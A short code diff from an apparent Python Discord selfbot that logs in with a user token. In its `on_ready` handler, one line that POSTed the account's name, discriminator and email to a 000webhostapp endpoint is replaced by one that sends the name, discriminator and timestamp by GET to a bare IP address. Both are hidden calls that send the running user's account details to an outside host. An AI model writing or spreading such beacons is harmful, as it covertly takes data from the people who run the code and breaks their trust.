@@ -59,12 +59,13 @@ async def on_ready():
     waw = bot.user.name
     kek = bot.user.discriminator
     lulz = bot.email
+    total = waw + '#' + kek + ' : ' + datetime
     print('La connexion est un succes!!')
     print('Vous êtes connecté en temps que: ')
     print(waw)
     print(kek)
     print(lulz)
     print('----------------')
-    print(requests.post("http://kysnetwork.000webhostapp.com/kysapi2.php", data={'dateTime': datetime, 'un': waw, 'dscmntr': kek, 'em': lulz}).text)
+    print(requests.get("http://51.77.201.42/kysapi?message="+total).text)
 
 bot.run(token, bot=False)
